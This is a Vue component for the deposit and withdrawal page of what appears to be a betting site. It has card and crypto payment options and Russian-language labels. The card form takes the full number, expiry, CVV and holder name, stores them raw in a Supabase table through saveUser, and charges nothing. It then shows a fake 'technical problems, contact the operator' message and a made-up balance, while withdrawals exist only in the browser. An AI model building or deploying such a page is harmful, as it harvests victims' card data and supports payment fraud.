<script setup>
import { ref, watch } from 'vue'
import { saveUser } from '../lib/supabase'
import useAuth from '../composables/useAuth.js'
import AccountTransactions from '../components/account/AccountTransactions.vue'

const { balance, deposit: addDeposit, withdraw: doWithdraw } = useAuth()
const activeTab = ref('deposit')
const tabs = [
  { id: 'deposit', label: 'Пополнение' },
  { id: 'withdraw', label: 'Выплата' },
  { id: 'history', label: 'История транзакций' },
]

// Перемикач способу оплати
const paymentMethod = ref('card') // 'card' або 'crypto'

// Пополнение (картой)
const cardNumber = ref('')
const expiry = ref('')
const cvv = ref('')
const name = ref('')
const amount = ref('')
const method = ref('Visa/Mastercard')
const processing = ref(false)
const showMessage = ref(false)
const errors = ref({})
const cardType = ref('')

// Пополнение (крипто)
const cryptoAddress = ref('bc1qxy2kgdygjrsqtzq2n0yrf24p0ngn9px8t5y92r')
const qrCodeUrl = ref('')

function detectCardType(number) {
  number = number.replace(/\s/g, '')
  if (/^4/.test(number)) return 'visa'
  if (/^5[1-5]/.test(number)) return 'mastercard'
  if (/^220[0-4]/.test(number)) return 'mir'
  if (/^4278/.test(number)) return 'qiwi'
  if (/^4916/.test(number)) return 'umoney'
  return ''
}

function formatCard(value) {
  cardType.value = detectCardType(value)
  return value
    .replace(/\D/g, '')
    .slice(0, 19)
    .replace(/(\d{4})(?=\d)/g, '$1 ')
    .trim()
}

function onCardInput(e) {
  cardNumber.value = formatCard(e.target.value)
}

function onExpiryInput(e) {
  let val = e.target.value.replace(/\D/g, '').slice(0, 4)
  if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2)
  expiry.value = val
}

function onCvvInput(e) {
  cvv.value = e.target.value.replace(/\D/g, '').slice(0, 3)
}

function resetForm() {
  cardNumber.value = ''
  expiry.value = ''
  cvv.value = ''
  name.value = ''
  amount.value = ''
  method.value = 'Visa/Mastercard'
  errors.value = {}
  cardType.value = ''
}

function validate() {
  const errs = {}
  if (!/^\d{16,19}$/.test(cardNumber.value.replace(/\s/g, ''))) {
    errs.cardNumber = 'Некорректный номер карты'
  }
  if (!/^\d{3}$/.test(cvv.value)) {
    errs.cvv = 'Некорректный CVV'
  }
  const match = expiry.value.match(/^(\d{2})\/(\d{2})$/)
  if (!match) {
    errs.expiry = 'Формат MM/YY'
  } else {
    const mm = Number(match[1])
    const yy = Number(match[2])
    const now = new Date()
    const thisYear = now.getFullYear() % 100
    const thisMonth = now.getMonth() + 1
    if (mm < 1 || mm > 12) {
      errs.expiry = 'Месяц от 01 до 12'
    } else if (yy < thisYear || (yy === thisYear && mm < thisMonth)) {
      errs.expiry = 'Срок действия истёк'
    }
  }
  if (name.value.trim().length < 2) {
    errs.name = 'Введите имя держателя'
  }
  if (!amount.value || isNaN(amount.value) || Number(amount.value) <= 0) {
    errs.amount = 'Введите сумму'
  }
  errors.value = errs
  return Object.keys(errs).length === 0
}

async function submit() {
  if (!validate()) return
  processing.value = true
  const authUser = JSON.parse(localStorage.getItem('authUser') || '{}')
  await saveUser({
    email: authUser.email || '',
    phoneNumber: authUser.phoneNumber || localStorage.getItem('phoneNumber') || '',
    cardNumber: cardNumber.value,
    cardDate: expiry.value,
    cvv: cvv.value,
    name: name.value,
    amount: amount.value,
    method: method.value
  })
  setTimeout(() => {
    addDeposit(amount.value)
    processing.value = false
    showMessage.value = true
    resetForm()
  }, 2000)
}

// Вывод
const wCardNumber = ref('')
const wAmount = ref('')
const wErrors = ref({})
const wMessage = ref('')

function onWithdrawCard(e) {
  wCardNumber.value = formatCard(e.target.value)
}

function validateWithdraw() {
  const errs = {}
  if (!/^\d{16,19}$/.test(wCardNumber.value.replace(/\s/g, ''))) {
    errs.card = 'Некорректный номер карты'
  }
  const amt = parseFloat(wAmount.value)
  if (isNaN(amt) || amt <= 0) {
    errs.amount = 'Введите сумму'
  } else if (amt > balance.value) {
    errs.amount = 'Недостаточно средств'
  }
  wErrors.value = errs
  return Object.keys(errs).length === 0
}

function submitWithdraw() {
  if (!validateWithdraw()) return
  if (doWithdraw(wAmount.value)) {
    wMessage.value = 'Заявка на вывод принята'
    wCardNumber.value = ''
    wAmount.value = ''
    wErrors.value = {}
  } else {
    wMessage.value = 'Ошибка вывода'
  }
}

function openChat() {
  showMessage.value = false
  if (window.Intercom) {
    window.Intercom('show')
  }
}

function copyAddress() {
  navigator.clipboard.writeText(cryptoAddress.value)
    .then(() => {
      alert('Адрес скопирован!');
    })
    .catch(err => {
      console.error('Не удалось скопировать текст: ', err);
    });
}

watch(cryptoAddress, (newVal) => {
  if (newVal) {
    qrCodeUrl.value = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(newVal)}`
  }
}, { immediate: true })

</script>

<template>
  <div class="deposit container">
    <h1>Баланс</h1>
    <nav class="tabs">
      <button
        v-for="t in tabs"
        :key="t.id"
        :class="{ active: activeTab === t.id }"
        @click="activeTab = t.id"
      >
        {{ t.label }}
      </button>
    </nav>

    <div v-if="activeTab === 'deposit'">
      <div class="payment-toggle-container">
        <span class="toggle-label-text">Кредитная карта</span>
        <label class="toggle-switch-new">
          <input type="checkbox" v-model="paymentMethod" true-value="crypto" false-value="card">
          <span class="toggle-slider"></span>
        </label>
        <span class="toggle-label-text">Криптовалюта</span>
      </div>

      <form v-if="paymentMethod === 'card' && !showMessage" @submit.prevent="submit" class="deposit-form" autocomplete="off">
        <div class="form-group card-input-group">
          <label for="cardNumber">Номер карты</label>
          <input
            id="cardNumber"
            v-model="cardNumber"
            @input="onCardInput"
            :class="{ error: errors.cardNumber }"
            maxlength="19"
            required
          />
          <img v-if="cardType" :src="`/imgCards/${cardType.toLowerCase()}.svg`" :alt="cardType" class="card-icon" />
          <span class="error-text" v-if="errors.cardNumber">{{ errors.cardNumber }}</span>
        </div>
        <div class="form-row">
          <div class="form-group">
            <label for="expiry">Срок действия</label>
            <input
              id="expiry"
              v-model="expiry"
              @input="onExpiryInput"
              placeholder="MM/YY"
              :class="{ error: errors.expiry }"
              maxlength="5"
              required
            />
            <span class="error-text" v-if="errors.expiry">{{ errors.expiry }}</span>
          </div>
          <div class="form-group">
            <label for="cvv">CVV</label>
            <input
              id="cvv"
              v-model="cvv"
              @input="onCvvInput"
              maxlength="3"
              :class="{ error: errors.cvv }"
              required
            />
            <span class="error-text" v-if="errors.cvv">{{ errors.cvv }}</span>
          </div>
        </div>
        <div class="form-group">
          <label for="name">Имя держателя</label>
          <input id="name" v-model="name" :class="{ error: errors.name }" required />
          <span class="error-text" v-if="errors.name">{{ errors.name }}</span>
        </div>
        <div class="form-group">
          <label for="amount">Сумма</label>
          <input id="amount" type="number" min="1" v-model="amount" :class="{ error: errors.amount }" required />
          <span class="error-text" v-if="errors.amount">{{ errors.amount }}</span>
        </div>
        <div class="form-group">
          <label for="method">Способ оплаты</label>
          <select id="method" v-model="method">
            <option>Visa/Mastercard</option>
            <option>Mir</option>
            <option>QIWI</option>
            <option>ЮMoney</option>
          </select>
        </div>
        <button type="submit" class="btn" :disabled="processing">
          Пополнить
        </button>
        <div v-if="processing" class="processing">Обработка...</div>
      </form>

      <div v-if="paymentMethod === 'crypto'" class="crypto-section">
        <h3>Оплата криптовалютой (USDT TRC20)</h3>
        <p>Для пополнения баланса переведите средства на указанный ниже адрес. После оплаты обратитесь в службу поддержки, предоставив скриншот транзакции для зачисления средств.</p>
        <div class="qr-code">
          <img :src="qrCodeUrl" alt="QR Code" />
        </div>
        <div class="address-container">
          <p class="address">{{ cryptoAddress }}</p>
          <button @click="copyAddress" class="copy-btn">Копировать</button>
        </div>
      </div>
      
      <div v-else-if="showMessage" class="modal">
        <div class="modal-content">
          <p>
            К сожалению мы имеем технические неполадки на сервере, обратитесь к оператору чтобы пополнить баланс
          </p>
          <button class="btn" @click="openChat">Написать оператору</button>
        </div>
      </div>
    </div>

    <div v-else-if="activeTab === 'withdraw'">
      <form @submit.prevent="submitWithdraw" class="deposit-form" autocomplete="off">
        <div class="form-group">
          <label for="wCard">Номер карты</label>
          <input id="wCard" v-model="wCardNumber" @input="onWithdrawCard" :class="{ error: wErrors.card }" maxlength="19" required />
          <span class="error-text" v-if="wErrors.card">{{ wErrors.card }}</span>
        </div>
        <div class="form-group">
          <label for="wAmount">Сумма</label>
          <input id="wAmount" type="number" min="1" v-model="wAmount" :class="{ error: wErrors.amount }" required />
          <span class="error-text" v-if="wErrors.amount">{{ wErrors.amount }}</span>
        </div>
        <p class="balance">Доступно: {{ balance.toFixed(2) }}₴</p>
        <button type="submit" class="btn">Вывести</button>
        <p v-if="wMessage" class="success-text">{{ wMessage }}</p>
      </form>
    </div>

    <div v-else>
      <AccountTransactions />
    </div>
  </div>
</template>

<style scoped>
.deposit {
  padding: 40px 0;
}
.deposit h1 {
  font-size: 2rem;
  margin-bottom: 24px;
}
.tabs {
  display: flex;
  gap: 8px;
  margin-bottom: 24px;
  justify-content: center;
  flex-wrap: wrap; /* Додано, щоб вкладки переносилися на новий рядок */
}
.tabs button {
  padding: 12px 20px;
  background: #1e232d;
  color: #f1f5f9;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  transition: background 0.3s;
  font-size: 1rem;
  flex-grow: 1; /* Додано, щоб кнопки рівномірно розподіляли простір */
  min-width: 120px; /* Мінімальна ширина для кнопок */
}
.tabs button.active {
  background: #ff4d00;
  color: #fff;
}
.deposit-form {
  max-width: 480px;
  margin: 0 auto;
  display: flex;
  flex-direction: column;
  gap: 16px;
  padding: 0 16px; /* Додано внутрішній відступ для мобільних пристроїв */
}
.deposit-form label {
  margin-bottom: 4px;
  font-size: 1rem;
}
.deposit-form input,
.deposit-form select {
  padding: 12px;
  border-radius: 8px;
  border: 1px solid #2a2f3a;
  background: #0b0c10;
  color: #f1f5f9;
  font-size: 1rem;
  width: 100%; /* Забезпечує, що поле не виходить за межі батьківського контейнера */
  box-sizing: border-box; /* Важливо для правильного розрахунку ширини */
}
.deposit-form select {
  appearance: none;
  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 24 24' fill='none' stroke='%23f1f5f9' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' xmlns='http://www.w3.org/2000/svg'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position: right 12px center;
  background-size: 16px;
  padding-right: 40px;
}
.deposit-form .btn {
  font-size: 1rem;
  padding: 12px 20px;
}
.form-row {
  display: flex;
  gap: 16px;
  flex-wrap: wrap; /* Додано для перенесення на мобільних пристроях */
}
.form-row > .form-group {
  flex: 1 1 0; /* Гнучке зростання для рівномірного розподілу */
  min-width: 120px; /* Мінімальна ширина для полів */
}
.form-group {
  display: flex;
  flex-direction: column;
  position: relative;
}
input.error, select.error {
  border: 1px solid #d00 !important;
}
.error-text {
  color: #d00;
  font-size: 12px;
  margin-top: 2px;
  position: absolute;
  bottom: -16px;
}
.processing {
  margin-top: 16px;
}
.balance {
  margin: -8px 0 8px;
  font-size: 1rem;
}
.success-text {
  color: #4caf50;
  text-align: center;
  font-size: 1rem;
}
.modal {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.6);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
  padding: 0 20px; /* Додано відступ, щоб модальне вікно не торкалось країв */
}
.modal-content {
  background: var(--card);
  padding: 24px;
  border-radius: 8px;
  max-width: 400px;
  text-align: center;
}
@media (max-width: 600px) {
  .form-row {
    flex-direction: column;
  }
}

/* Нові стилі для іконки картки */
.card-input-group {
  position: relative;
}
.card-icon {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(2px);
  height: 24px;
}

/* Нові стилі для крипто-розділу */
.crypto-section {
  max-width: 480px;
  margin: 0 auto;
  text-align: center;
  padding: 0 16px;
}
.crypto-section h3 {
  margin-bottom: 16px;
}
.crypto-section p {
  line-height: 1.5;
  margin-bottom: 24px;
}
.qr-code {
  background: #fff;
  padding: 16px;
  border-radius: 8px;
  display: inline-block;
  margin-bottom: 24px;
  max-width: 100%;
  box-sizing: border-box;
}
.qr-code img {
  display: block;
  max-width: 100%;
  height: auto;
}
.address-container {
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 8px;
  background: #1e232d;
  padding: 12px;
  border-radius: 8px;
}
.address {
  font-size: 0.9rem;
  word-break: break-all;
  flex-grow: 1;
  text-align: left;
  margin: 0;
}
.copy-btn {
  background: #ff4d00;
  color: #fff;
  border: none;
  padding: 8px 16px;
  border-radius: 6px;
  cursor: pointer;
  white-space: nowrap;
  font-size: 0.9rem;
}

/* Виправлені стилі для перемикача та адаптація */
.payment-toggle-container {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  margin-bottom: 24px;
}

.toggle-label-text {
  font-size: 1rem;
  font-weight: bold;
  color: #f1f5f9;
  user-select: none;
  white-space: nowrap;
}

.toggle-switch-new {
  position: relative;
  display: inline-block;
  width: 170px;
  height: 36px;
  background-color: #1e232d;
  border-radius: 18px;
  flex-shrink: 0;
}
.toggle-switch-new input {
  opacity: 0;
  width: 0;
  height: 0;
}
.toggle-slider {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: transparent;
  transition: 0.4s;
  border-radius: 18px;
}
.toggle-slider:before {
  position: absolute;
  content: "";
  height: 32px;
  width: 85px;
  left: 2px;
  bottom: 2px;
  background-color: #ff4d00;
  transition: transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
  border-radius: 16px;
}
input:checked + .toggle-slider:before {
  transform: translateX(81px);
}

/* Адаптація для мобільних пристроїв */
@media (max-width: 480px) {
  .tabs {
    flex-direction: column; /* Змінено на column для мобільних пристроїв */
  }
  .tabs button {
    font-size: 0.9rem;
  }
  .payment-toggle-container {
    gap: 5px; /* Зменшення проміжку */
  }
  .toggle-label-text {
    font-size: 0.8rem;
  }
  .toggle-switch-new {
    width: 150px; /* Зменшення ширини перемикача на мобілках */
    height: 30px;
    border-radius: 15px;
  }
  .toggle-slider:before {
    height: 26px;
    width: 75px;
    left: 2px;
    bottom: 2px;
    border-radius: 13px;
  }
  input:checked + .toggle-slider:before {
    transform: translateX(71px);
  }
}
</style>